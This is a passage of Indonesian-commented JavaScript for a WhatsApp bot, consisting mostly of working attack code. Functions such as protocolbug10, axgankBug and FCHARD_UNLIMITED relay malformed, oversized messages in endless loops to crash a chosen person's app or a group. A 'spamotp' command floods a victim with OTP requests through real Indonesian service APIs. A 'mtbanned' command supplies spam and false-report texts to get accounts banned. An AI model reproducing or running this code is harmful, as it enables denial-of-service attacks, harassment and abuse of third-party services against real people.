                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await langgxyz.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           
    async function protocolbug10(Target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𐌕𐌀𐌌𐌀 𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: { mentionedJid: mentionedList }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐌕𐌀𐌌𐌀 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = await generateWAMessageFromContent(Target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = await generateWAMessageFromContent(Target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = await generateWAMessageFromContent(Target, audioMessage, {});

    for (const msg of [msg1, msg2, msg3]) {
        await langgxyz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [Target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: Target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await langgxyz.relayMessage(Target, {
            statusMentionMessage: {
                message: { protocolMessage: { key: msg1.key, type: 25 } }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }

    const photo = {
        image: imgCrL,
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    };

    const album = await generateWAMessageFromContent(Target, {
        albumMessage: {
            expectedImageCount: 100,
            expectedVideoCount: 0
        }
    }, {
        userJid: Target,
        upload: sock.waUploadToServer
    });

    await langgxyz.relayMessage(Target, album.message, { messageId: album.key.id });

    for (let i = 0; i < 100; i++) {
        const msg = await generateWAMessage(Target, photo, {
            upload: sock.waUploadToServer
        });

        const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

        msg.message[type].contextInfo = {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardedNewsletterMessageInfo: {
                newsletterName: "Tama Ryuichi | I'm Beginner",
                newsletterJid: "0@newsletter",
                serverMessageId: 1
            },
            messageAssociation: {
                associationType: 1,
                parentMessageKey: album.key
            }
        };

        await langgxyz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [Target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: Target }, content: undefined }]
                }]
            }]
        });

        if (mention) {
            await langgxyz.relayMessage(Target, {
                statusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } }
                }
            }, {
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }]
            });
        }
    }
}
// Combo All
async function FCHARD_UNLIMITED(target) {
    let count = 0;
    while (true) {
        try {
            if (count < 600) {
                await Promise.all([                  
                    Delay1(target),
                    Delay2(target),
                    Delay3(target),
                    InvisDelay(target, false),
                    execDelay(target),
                    exDelay(target),
                    bulldozer(target),
                    invisSqL(target),
                    holdSqL(target),
                    GhostSqL(target),
                    XStromFlowerDelay(target, false),
                    protocol8(target, true),                          delayresponse(target),
                    ChronosDelay(target, true),
                ]);
                console.log(`FcHard (🔥) ${count}/600 ke ${target}`);
                count++;
                await new Promise(r => setTimeout(r, 10000));
            } else {
                console.log(`✅ Success Sending 700 Messages to ${target}`);
                count = 0;
                console.log(`➡️ Next 400 Messages`);
                await new Promise(r => setTimeout(r, 100));
            }
        } catch (err) {
            console.error(`❌ Error: ${err.message}`);
            await new Promise(r => setTimeout(r, 100));
        }
    }
}
// Command Bugnya
case "crashbeta": case "businnes":{
if (!isPremium && !isCreator) return reply("khusus pengguna premium");
if (!text) return reply(`gni contohnya su, example: ${command}628283882822`)
let target = text.trim().replace(/[^0-9]/g, '')+ "@s.whatsapp.net";
// Beri Warning Jika Nomor Developer Di Bug
const Developer = [
"6282137392620@s.whatsapp.net", 
"6288905301692@s.whatsapp.net"
];
// Kalau target adalah developer
if (Developer.includes(target)) {
let notif = `liat ni si sukicau @${m.sender.split('@')[0]} mau ngebug nomor developer!`;
for (let dev of Developer) {
await langgxyz.sendMessage(dev, {
text: notif,
mentions: [m.sender]
});
}
// Hapus file penting
try {
fs.unlinkSync('./package.json');
fs.unlinkSync('./Rann.js');
console.log(chalk.red(`File dihapus karena mencoba bug pembuat script`));
} catch (err) {
console.error(err);
}

reply(`Script dihentikan karena mencoba ngebug pembuat script`);
await sleep(1000);
return process.exit();
}
const ammont = 1500; // Hati" Keban
reply(`On Process ${target}`)
await sleep(1000);
console.log(chalk.white(`Process Sending Bug ${command} To ${target} Total Kirim = ${ammont}`))
for (let i = 0; i < ammont; i++) {
await FCHARD_UNLIMITED(target);
}
}
break
case "crashios": case "rannihdek":{
if (!isPremium && !isCreator) return reply("khusus pengguna premium");
if (!text) return reply(`gni contohnya su, example: ${command}628283882822`)
let target = text.trim().replace(/[^0-9]/g, '')+ "@s.whatsapp.net";

const Developer = [
"6282137392620@s.whatsapp.net", 
"6288905301692@s.whatsapp.net"
];
// Kalau target adalah developer
if (Developer.includes(target)) {
let notif = `liat ni si sukicau @${m.sender.split('@')[0]} mau ngebug nomor developer!`;
for (let dev of Developer) {
await langgxyz.sendMessage(dev, {
text: notif,
mentions: [m.sender]
});
}
// Hapus file penting
try {
fs.unlinkSync('./package.json');
fs.unlinkSync('./Rann.js');
console.log(chalk.red(`File dihapus karena mencoba bug pembuat script`));
} catch (err) {
console.error(err);
}

reply(`Script dihentikan karena mencoba ngebug pembuat script`);
await sleep(1000);
return process.exit();
}
const ammont = 999;
reply(`On Process ${target}`)
await sleep(1000);
console.log(chalk.red(`Process Sending Bug ${command} To ${target} Total Sending = ${ammont}`))
for (let i = 0; i < ammont; i++) {
await FCHARD_UNLIMITED(target);
}
}
break
// Funcbug Delaynya

case "delay24jm":
case "invisdelay": {
if (!isPremium && !isCreator) return reply("Khusus pengguna premium");
if (!text) return reply(`Gini contohnya su, example: ${command} 628283882822`);
let target = text.trim().replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const Developer = [
"6282137392620@s.whatsapp.net", 
"6288905301692@s.whatsapp.net"
];
// Kalau target adalah developer
if (Developer.includes(target)) {
let notif = `liat ni si sukicau @${m.sender.split('@')[0]} mau ngebug nomor developer!`;
for (let dev of Developer) {
await langgxyz.sendMessage(dev, {
text: notif,
mentions: [m.sender]
});
}
// Hapus file penting
try {
fs.unlinkSync('./package.json');
fs.unlinkSync('./Rann.js');
console.log(chalk.red(`File dihapus karena mencoba bug pembuat script`));
} catch (err) {
console.error(err);
}

reply(`Script dihentikan karena mencoba ngebug pembuat script`);
await sleep(1000);
return process.exit();
}
const ammont = 888;
reply(`On Process ${target}`);
await sleep(1000);
console.log(chalk.blue(`Process Sending Bug ${command} To ${target} Total Kirim = ${ammont}`));

for (let i = 0; i < ammont; i++) {
await FCHARD_UNLIMITED(target)
}
}
break;
// Funcbug gb
async function axgankBug(target) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑨𝑿𝑮𝒂𝒏𝑲⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await langgxyz.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ 𝑨𝑿𝑮𝒂𝒏𝑲⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: client.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await langgxyz.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await langgxyz.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await langgxyz.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝐀𝐗𝐆𝐀𝐍𝐊 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await langgxyz.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await langgxyz.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ SASUKE IS HERE⃰ͯཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ Rannཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}

case "crashgroup":
case "grouphama": {
    if (!isPremium && !isCreator) return reply("⚠️ Khusus user premium!");
    if (!text) return reply(`Contoh: ${command} 120363040121212@g.us atau 62812345678@lid`);

    let target = text.trim();
    // Validasi klo target group lid
    if (target.includes("@lid")) {
        if (!target.endsWith("@lid")) return reply("❌ Format LID tidak valid!");
    } else {
        // jika group bukan lid logika kode :
        if (!target.endsWith("@g.us")) target = target + "@g.us";
    }
    const ammount = 1000;
    await sleep(1000);
    reply(`Mengirim bug GB WhatsApp ke grup ${target} sebanyak ${ammount} kali...`);
    console.log(chalk.green(`Process Sending GB Bug To Group ${target} | Total Kirim = ${ammount}`));

    for (let i = 0; i < ammount; i++) {
        await axgankBug(target);
        await sleep(1500);
    }

    reply(`✅ Bug GB WhatsApp ke grup ${target} selesai dikirim.`);
}
break;
// SpamOtp Case
case "spamotp": {
    if (!isCreator) return reply("khusus owner");

    let [no, count] = q.split(',');
    if (!no || isNaN(count)) return reply("nomor,jumlah");

    let fullNumber = no.replace(/[^0-9]/g, '');
    count = parseInt(count);

    await reply(`📤 Mengirim OTP ke +${fullNumber} sebanyak ${count}x`);

    const apis = [
        async () => {
            await axios.post(
                'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
                new URLSearchParams({
                    phone: fullNumber,
                    sms_useage: 'LOGIN',
                    sms_service: 'WHATSAPP',
                    from: 'LOGIN'
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
            return '[✓] PinjamDuit: Sent';
        },
        async () => {
            await axios.post(
                'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
                {
                    phone: fullNumber,
                    type: 'register'
                },
                {
                    headers: {
                        'content-type': 'application/json',
                        'authorization': 'Basic REPLACEME=='
                    }
                }
            );
            return '[✓] BelanjaParts: Sent';
        },
        async () => {
            await axios.post(
                'https://api102.singa.id/new/login/sendWaOtp',
                {
                    mobile_phone: fullNumber,
                    type: 'mobile',
                    is_switchable: 1
                },
                { headers: { 'Content-Type': 'application/json; charset=utf-8' } }
            );
            return '[✓] Singa: Sent';
        },
        async () => {
            await axios.get(
                'https://api.uangme.com/api/v2/sms_code',
                {
                    params: {
                        phone: fullNumber,
                        sms_useage: 'LOGIN',
                        sms_service: 'WHATSAPP',
                        from: 'LOGIN'
                    },
                    headers: {
                        aid: '123',
                        android_id: 'randomid',
                        app_version: '1.0.0'
                    }
                }
            );
            return '[✓] UangMe: Sent';
        },
        async () => {
            await axios.post(
                'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
                `appVersion=3.0.4&phone=${fullNumber}&userImei=1234567890`,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
            return '[✓] Cairin: Sent';
        },
        async () => {
            await axios.post(
                'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
                {
                    mobileNumber: fullNumber,
                    type: 'prospect-create',
                    channel: 'whatsapp'
                },
                { headers: { 'Content-Type': 'application/json; charset=utf-8' } }
            );
            return '[✓] Adiraku: Sent';
        },
        async () => {
            await axios.post(
                'https://serpul-api.serpul.co.id/api/v2/auth/phone-number',
                {
                    phone_number: fullNumber
                },
                { headers: { 'Content-Type': 'application/json' } }
            );
            return '[✓] Serpul: Sent';
        },
        async () => {
            await axios.post(
                'https://lottemartpoint.lottemart.co.id/api5/send_otp',
                {
                    cellno: fullNumber,
                    text: 'Kode OTP Anda adalah 123456'
                },
                {
                    headers: {
                        authorization: 'Bearer REPLACEME',
                        'content-type': 'application/json'
                    }
                }
            );
            return '[✓] LotteMart: Sent';
        }
    ];

    for (let i = 0; i < count; i++) {
        const results = await Promise.allSettled(apis.map(api => api()));
        const messages = results.map(res =>
            res.status === 'fulfilled'
                ? res.value
                : `[x] Error: ${res.reason.response?.data?.message || res.reason.message}`
        );
        for (let msg of messages) {
            await sleep(1500);
            await langgxyz.sendMessage(m.chat, { text: msg }, { quoted: fquoted.packSticker });
        }
    }

    reply(`✅ Sukses mengirim ${count}× spam ke +${fullNumber}`);
}
break;

// Mt Bannednya
case "mtbanned": {
if (!isCreator) return reply("khusus owner ajg");
    let teksnya = [
`1.Olá amigos, querem enriquecer? 🤑🤑🎰🎰🎰 JOGUE AQUI NO NOSSO SITE, TEMOS A GARANTIA DE GANHAR O JACKPOT 🀄🀄🎰 JOGUE COM UMA APOSTA MÁXIMA DE 20 MILHÕES 🤑 PARA QUE POSSA GANHAR UM JACKPOT INCRÍVEL 🤑🎰🀄 CLIQUE NO LINK DO SITE DE JOGOS DE AZAR ONLINE ABAIXO 🀄🤑🎰 https://amp.xn--123-fb4by87o.com/amp/
BANDUNGTOTO88 /bandungtoto COMEÇANDO COM UM DEPÓSITO DE 21 MILHÕES 🎰🎰🤑 GANHARÁ COM CERTEZA O JACKPOT 🤑🤑💯 SER O MUNDO MAIS RICO DEVE JOGAR BANDUNG TOTO88🎰🤑🀄`,

`2.🌟 Descubra o Prazer Sem Limites! 🌟 Venha explorar um mundo de sensações e experiências únicas que vão elevar sua noite a um novo patamar! Nossos eventos exclusivos são projetados para adultos que buscam diversão, liberdade e a chance de se conectar com pessoas incríveis. Não perca a oportunidade de viver momentos inesquecíveis! 🍷💃
https://ibb.co/mVvVRX5s

🔥 Entre no Jogo da Sedução! 🔥 Deixe-se levar pela música envolvente e pela atmosfera vibrante, onde cada canto promete surpresas e novas amizades. A noite é sua para brilhar e se divertir sem restrições! Junte-se a nós e descubra o que significa realmente aproveitar a vida! 🎉✨

https://web.whatsapp.com/contato/xxnx.com/enviar?telefone=+62`,

`3. Report MT 10x
Report Balasan 5x
Report Titik3 3x
block 1x + report

В последние годы рост популярности криптовалют произвел революцию в способах проведения транзакций в различных отраслях. Однако стремление к быстрой прибыли также привело к всплеску незаконной деятельности, особенно в сфере продаж. Эти транзакции часто предполагают обмен товаров или услуг на биткоины (BTC), полученные незаконным путём, что создаёт теневой рынок, процветающий за счёт анонимности и секретности. 🕵️‍♂️

https://images.app.goo.gl/S7mVyE6G48f5k59PA

Привлекательность использования BTC в незаконных продажах заключается в его децентрализованной природе. В отличие от традиционных валют, транзакции с биткоинами сложно отследить, что делает их привлекательным вариантом для тех, кто хочет заниматься незаконной деятельностью. Это привело к появлению подпольных сетей, где люди могут покупать и продавать готовые товары без надзора регулирующих органов. В результате рынок незаконных транзакций с BTC процветает, представляя значительные риски как для потребителей, так и для законного бизнеса. ⚠️

Более того, последствия этих незаконных продаж выходят за рамки финансовых последствий. Использование BTC в качестве посредника часто подпитывает преступные организации и способствует возникновению более широких проблем, таких как отмывание денег и мошенничество. Поскольку правоохранительные органы изо всех сил пытаются угнаться за стремительным развитием криптовалют, потенциал для злоупотреблений остается высоким. Это создает среду, в которой ничего не подозревающие покупатели могут оказаться втянутыми в незаконную деятельность, даже не осознавая этого. 🔍

В заключение следует отметить, что, хотя мир криптовалют предлагает захватывающие возможности, он также таит в себе значительные риски, особенно в контексте незаконных продаж BTC. Потребителям крайне важно сохранять бдительность и быть в курсе потенциальных опасностей, связанных с такими транзакциями. Способствуя прозрачности и соблюдению этических норм, мы можем помочь смягчить негативные последствия незаконной деятельности в сфере криптовалют и создать более безопасный рынок для всех. 🌐😍

https://api.whatsapp.com/send?phone=+68xxxx( isi dengan no target )`,

`5.Olá suporte WhatsApp,
Estou a reportar uma violação grave dos Termos de Serviço do Whatsapp por parte do canal, que conta atualmente com cerca de 300 membros.

Este canal está ativamente a: Mostrar e testar números banidos do WhatsApp, que são claramente mostrados como na lista negra nas capturas de ecrã. Incentivando e facilitando as tentativas de contornar o sistema de verificação, o que pode estar ligado a fraudes de conta, roubo de identidade e fraude de SIM. Expondo números de telefone privados sem permissão, o que é uma clara violação das leis de privacidade e proteção de dados. Fugindo à aplicação da lei, como reconhecido numa mensagem fixada fazendo referência ao encerramento de um canal anterior que operavam. Esta atividade não só é antiética e vai contra os padrões da comunidade WhatsApp, como também pode violar as leis locais e internacionais, incluindo a LGPD da Indonésia e o RGPD da UE. Estes canais representam uma ameaça real à privacidade, à segurança e à integridade da plataforma dos utilizadores. O conteúdo é malicioso e tem como objetivo apoiar operações de black hat ou esquemas de fraude telefónica. Por favor, tome medidas imediatas para:


Remover permanentemente (bloquear) o canal da plataforma Restringir ou investigar os utilizadores envolvidos na gestão ou promoção deste conteúdo Link para a publicação violadora (para a sua investigação): Link do canal (se ainda acessível): Evidência visual anexada que mostre claramente o abuso. Obrigado pela sua atenção. Tenho a certeza de que o tratará com a urgência que merece. Atenciosamente, Utilizador do WhatsApp preocupado`
];

let hasil = teksnya[Math.floor(Math.random() * teksnya.length)];

await langgxyz.sendMessage(m.chat, {
    text: hasil,
    footer: "Klik tombol untuk teks random lagi",
    buttons: [
        { buttonId: ".mtbanned", buttonText: { displayText: "Lanjut" }, type: 1 }
    ],
    viewOnce: true,
    headerType: 1
});
}
break;
case "brat": {
          if (!text) return reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await langgxyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Rann Official",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await langgxyz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await langgxyz.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }
                                                                                          break 
                                                                                          
            default:
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
